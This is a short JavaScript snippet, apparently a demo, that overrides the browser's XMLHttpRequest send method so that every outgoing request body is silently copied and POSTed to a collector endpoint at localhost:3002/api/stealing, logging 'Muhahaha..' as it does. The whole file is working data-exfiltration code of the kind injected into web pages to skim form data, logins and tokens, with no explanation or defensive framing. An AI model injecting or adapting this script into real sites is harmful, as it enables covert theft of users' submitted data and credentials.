(function (window, document) {
  "use strict";

  var originalSendFn = window.XMLHttpRequest.prototype.send;

  window.XMLHttpRequest.prototype.send = function () {
    var args = Array.prototype.slice.call(arguments, 0);

    if (args[1] !== "DONTSTEAL") {
      var infoJackRequest = new XMLHttpRequest();
      infoJackRequest.open("POST", "http://localhost:3002/api/stealing");
      infoJackRequest.send(args[0], "DONTSTEAL");

      console.log("Muhahaha..");
    }

    return originalSendFn.apply(this, args);
  }

})(window, document);